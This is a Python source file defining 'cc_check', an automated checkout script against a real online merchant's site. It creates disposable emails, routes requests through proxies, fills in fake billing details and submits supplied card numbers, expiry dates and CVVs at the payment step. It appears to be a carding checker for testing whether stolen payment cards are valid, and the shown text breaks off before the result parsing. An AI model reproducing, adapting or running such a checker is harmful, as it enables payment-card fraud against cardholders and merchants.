import requests,re,random,string
from bs4 import BeautifulSoup
from proxy import proxies


def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    longitud = random.randint(8, 12)
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo


async def cc_check(cc, mm, yyyy, cvv):
    r = requests.session()
    email = email_generator()
    proxy = proxies()
    r.proxies = proxy
    if cc.startswith('4'):
        brand = 'VISA'
    elif cc.startswith(('51', '52', '53', '54', '55')):
        brand = 'MASTERCARD'
    elif cc.startswith(('34', '37')):
        brand = 'AMEX'
    elif cc.startswith(('6011', '622126', '622127', '622128', '622129')):
        brand = 'DISCOVER'
    elif cc.startswith(('35')):
        brand = 'JCB'

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724434152.58.0.1866174869',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/c-22-pins-buttons.aspx',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    response = r.get('https://www.bluescentric.com/p-3044-pink-floyd-animals-pig-enamel-pin.aspx',headers=headers,timeout=50)
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724434172.38.0.1866174869',
    'origin': 'https://www.bluescentric.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.bluescentric.com/p-3044-pink-floyd-animals-pig-enamel-pin.aspx',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    json_data = {
    'sProductId': 3044,
    'sVariantId': 3059,
    'sCartType': 0,
    'sQuantity': '1',
    'colorOptions': '',
    'sizeOptions': '',
    }

    response = r.post('https://www.bluescentric.com/ActionService.asmx/AddToCart',headers=headers,json=json_data,timeout=50)
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724434172.38.0.1866174869; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/p-3044-pink-floyd-animals-pig-enamel-pin.aspx',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    response = r.get('https://www.bluescentric.com/shoppingcart.aspx', headers=headers,timeout=50)
    __viewstate = re.findall(r'__VIEWSTATE" value="(.*?)"', response.text)[0]
    __viewstategenerator = re.findall(r'__VIEWSTATEGENERATOR" value="(.*?)"', response.text)[0]
    __eventvalidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', response.text)[0]
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724434572.59.0.1866174869',
    'origin': 'https://www.bluescentric.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/shoppingcart.aspx',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    data = {
    '__EVENTTARGET': '',
    '__EVENTARGUMENT': '',
    '__VIEWSTATE': __viewstate,
    '__VIEWSTATEGENERATOR': __viewstategenerator,
    '__EVENTVALIDATION': __eventvalidation,
    'ctl00$ctrlPageSearch$SearchText': '',
    'ctl00$PageContent$ctrlShoppingCart$ctl00$ctl01': '1',
    'ctl00$PageContent$txtPromotionCode': '',
    'ctl00$PageContent$hidCouponCode': '',
    'ctl00$PageContent$OrderNotes': '',
    'ctl00$PageContent$btnCheckout': 'Checkout Now',
}

    response = r.post('https://www.bluescentric.com/shoppingcart.aspx', headers=headers, data=data,timeout=50)
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724434699.58.0.1866174869',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/checkoutanon.aspx?checkout=true',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    params = {
    'checkout': 'true',
    'skipreg': 'true',
    }

    response = r.get('https://www.bluescentric.com/createaccount.aspx', params=params, headers=headers,timeout=50)
    __viewstate = re.findall(r'__VIEWSTATE" value="(.*?)"', response.text)[0]
    __viewstategenerator = re.findall(r'__VIEWSTATEGENERATOR" value="(.*?)"', response.text)[0]
    __eventvalidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', response.text)[0]
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724435109.59.0.1866174869',
    'origin': 'https://www.bluescentric.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/createaccount.aspx?checkout=true&skipreg=true',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    params = {
    'checkout': 'true',
    'skipreg': 'true',
    }

    data = {
    '__EVENTTARGET': 'ctl00$PageContent$btnContinueCheckout',
    '__EVENTARGUMENT': '',
    '__LASTFOCUS': '',
    '__VIEWSTATE': __viewstate,
    '__VIEWSTATEGENERATOR': __viewstategenerator,
    '__EVENTVALIDATION': __eventvalidation,
    'ctl00$ctrlPageSearch$SearchText': '',
    'ctl00$PageContent$txtAnonEmail': email,
    'ctl00$PageContent$Offers': 'rbAnonOffersNo',
    'ctl00$PageContent$ctrlBillingAddress$FirstName': 'Albedo',
    'ctl00$PageContent$ctrlBillingAddress$LastName': 'Jones',
    'ctl00$PageContent$ctrlBillingAddress$Phone': '5555962686',
    'ctl00$PageContent$ctrlBillingAddress$Address1': 'New York',
    'ctl00$PageContent$ctrlBillingAddress$Address2': '',
    'ctl00$PageContent$ctrlBillingAddress$City': 'New York',
    'ctl00$PageContent$ctrlBillingAddress$Country': 'United States',
    'ctl00$PageContent$ctrlBillingAddress$State': 'NY',
    'ctl00$PageContent$ctrlBillingAddress$Zip': '10080',
    'ctl00$PageContent$cbBillIsShip': 'on',
    'ctl00$PageContent$ctrlShippingAddress$FirstName': '',
    'ctl00$PageContent$ctrlShippingAddress$LastName': '',
    'ctl00$PageContent$ctrlShippingAddress$Phone': '',
    'ctl00$PageContent$ctrlShippingAddress$Address1': '',
    'ctl00$PageContent$ctrlShippingAddress$Address2': '',
    'ctl00$PageContent$ctrlShippingAddress$City': '',
    'ctl00$PageContent$ctrlShippingAddress$Country': 'United States',
    'ctl00$PageContent$ctrlShippingAddress$State': 'AL',
    'ctl00$PageContent$ctrlShippingAddress$Zip': '',
    'ctl00$PageContent$hidPagePlacement': '0',
}
    response = r.post('https://www.bluescentric.com/createaccount.aspx',params=params,headers=headers,data=data,timeout=50)
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724435109.59.0.1866174869',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/createaccount.aspx?checkout=true&skipreg=true',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    params = {
    'dontupdateid': 'true',
    }

    response = r.get('https://www.bluescentric.com/checkoutshipping.aspx', params=params, headers=headers,timeout=50)
    __viewstate = re.findall(r'__VIEWSTATE" value="(.*?)"', response.text)[0]
    __viewstategenerator = re.findall(r'__VIEWSTATEGENERATOR" value="(.*?)"', response.text)[0]
    __eventvalidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', response.text)[0]
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724435332.57.0.1866174869',
    'origin': 'https://www.bluescentric.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/checkoutshipping.aspx?dontupdateid=true',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    params = {
    'dontupdateid': 'true',
}

    data = {
    '__EVENTTARGET': '',
    '__EVENTARGUMENT': '',
    '__VIEWSTATE': __viewstate,
    '__VIEWSTATEGENERATOR': __viewstategenerator,
    '__EVENTVALIDATION': __eventvalidation,
    'ctl00$ctrlPageSearch$SearchText': '',
    'ctl00$PageContent$ctrlShippingMethods$ctrlShippingMethods': '6',
    'ctl00$PageContent$btnContinueCheckout': 'Continue Checkout',
    'ctl00$PageContent$OrderNotes': '',
}

    response = r.post('https://www.bluescentric.com/checkoutshipping.aspx',params=params,headers=headers,data=data,timeout=50)
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724435332.57.0.1866174869',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/checkoutshipping.aspx?dontupdateid=true',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    response = r.get('https://www.bluescentric.com/checkoutpayment.aspx',  headers=headers,timeout=50)
    __viewstate = re.findall(r'__VIEWSTATE" value="(.*?)"', response.text)[0]
    __viewstategenerator = re.findall(r'__VIEWSTATEGENERATOR" value="(.*?)"', response.text)[0]
    __eventvalidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', response.text)[0]
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724436593.58.0.1866174869',
    'origin': 'https://www.bluescentric.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/checkoutpayment.aspx',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    data = {
    '__EVENTTARGET': '',
    '__EVENTARGUMENT': '',
    '__LASTFOCUS': '',
    '__VIEWSTATE': __viewstate,
    '__VIEWSTATEGENERATOR': __viewstategenerator,
    '__EVENTVALIDATION': __eventvalidation,
    'ctl00$ctrlPageSearch$SearchText': '',
    'ctl00$PageContent$ctrlPaymentMethod$PaymentSelection': 'rbCREDITCARD',
    'ctl00$PageContent$ctrlCreditCardPanel$ddlCCType': brand,
    'ctl00$PageContent$ctrlCreditCardPanel$txtCCName': 'Albedo Jones',
    'ctl00$PageContent$ctrlCreditCardPanel$txtCCNumber': cc,
    'ctl00$PageContent$ctrlCreditCardPanel$ddlCCExpMonth': mm,
    'ctl00$PageContent$ctrlCreditCardPanel$ddlCCExpYr': yyyy,
    'ctl00$PageContent$ctrlCreditCardPanel$txtCCVerCd': cvv,
    'ctl00$PageContent$txtPromotionCode': '',
    'ctl00$PageContent$hidCouponCode': '',
    'ctl00$PageContent$btnContCheckout': 'Continue Checkout',
}

    response = r.post('https://www.bluescentric.com/checkoutpayment.aspx', headers=headers, data=data,timeout=50)
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724436593.58.0.1866174869',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/checkoutpayment.aspx',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    params = {
    'paymentmethod': 'CREDITCARD',
}

    response = r.get('https://www.bluescentric.com/checkoutreview.aspx', params=params,headers=headers,timeout=50)
    __viewstate = re.findall(r'__VIEWSTATE" value="(.*?)"', response.text)[0]
    __viewstategenerator = re.findall(r'__VIEWSTATEGENERATOR" value="(.*?)"', response.text)[0]
    __eventvalidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', response.text)[0]
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
